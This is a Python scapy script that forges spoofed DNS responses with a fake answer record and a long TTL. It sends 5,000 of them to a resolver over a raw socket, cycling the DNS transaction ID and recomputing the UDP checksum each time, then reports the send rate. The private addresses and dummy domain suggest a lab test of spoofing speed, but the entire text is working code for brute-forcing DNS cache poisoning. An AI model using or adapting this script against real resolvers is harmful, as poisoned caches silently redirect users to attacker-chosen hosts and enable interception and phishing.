from scapy.all import *
import random


def patch(dns_frame: bytearray, pseudo_hdr: bytes, dns_id: int):
    """Adjust the DNS id and patch the UDP checksum within the given Ethernet frame"""
    # set dns id
    # the byte offsets can be found in Wireshark
    dns_frame[42] = (dns_id >> 8) & 0xFF
    dns_frame[43] = dns_id & 0xFF

    # reset checksum
    dns_frame[40] = 0x00
    dns_frame[41] = 0x00

    # calc new checksum
    ck = checksum(pseudo_hdr + dns_frame[34:])
    if ck == 0:
        ck = 0xFFFF
    cs = struct.pack("!H", ck)
    dns_frame[40] = cs[0]
    dns_frame[41] = cs[1]


n_packets = 5000
response = (
    Ether()
    / IP(dst="192.168.2.1", src="192.168.2.102")
    / UDP(sport=53, dport=4444)
    / DNS(id=0, an=DNSRR(rrname="dummy.example.kom", ttl=70000, rdata="192.168.178.3"))
)
dns_frame = bytearray(raw(response))
pseudo_hdr = struct.pack(
    "!4s4sHH",
    inet_pton(socket.AF_INET, response["IP"].src),
    inet_pton(socket.AF_INET, response["IP"].dst),
    socket.IPPROTO_UDP,
    len(dns_frame[34:]),
)
s = conf.L2socket()

start_time = time.time()

for i in range(n_packets):
    patch(dns_frame, pseudo_hdr, (1024 + i) % 65535)
    # print(len(dns_frame))
    s.send(dns_frame)

end_time = time.time()
print(f"sent {n_packets} responses in {end_time - start_time:.3f} seconds")